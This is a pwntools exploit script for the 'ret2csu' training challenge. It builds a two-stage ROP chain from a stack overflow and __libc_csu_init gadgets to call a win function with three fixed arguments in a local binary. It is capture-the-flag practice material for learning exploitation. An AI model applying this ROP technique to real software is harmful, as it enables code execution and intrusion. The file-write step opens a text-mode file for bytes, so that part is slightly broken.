#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2csu
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2csu')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

filename = './ret2csu'
elf = ELF(filename)
io = process(filename)

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

#usefulFunction+19
ret2win_address = p64(0x40062a)

#__libc_csu_init+64
mov_rdx_r15 = p64(0x400680)
pop_r = p64(0x0040069a)
pop_rdi = p64(0x004006a3)

def stage_1():
    buffer = ROP(elf)
    buffer.raw(cyclic(40))
    buffer.raw(pop_r)
    buffer.raw(1)
    buffer.raw(2)
    buffer.raw(p64(0x600df0))
    buffer.raw(arg1)
    buffer.raw(arg2)
    buffer.raw(arg3)
    
    return buffer.chain()
    
def stage_2():
    buffer = ROP(elf)
    buffer.raw(mov_rdx_r15)
    buffer.raw(cyclic(7*8))
    buffer.raw(pop_rdi)
    buffer.raw(arg1)
    buffer.raw(ret2win_address)
    
    return buffer.chain()

def send_lines(buffer):
    io.sendline(buffer)
    data=io.recvall()
    print(data.decode())
    

payload = b''
payload += stage_1()
payload += stage_2()

with open("tmp","w") as f:
    f.write(payload)
    f.close()

send_lines(payload)
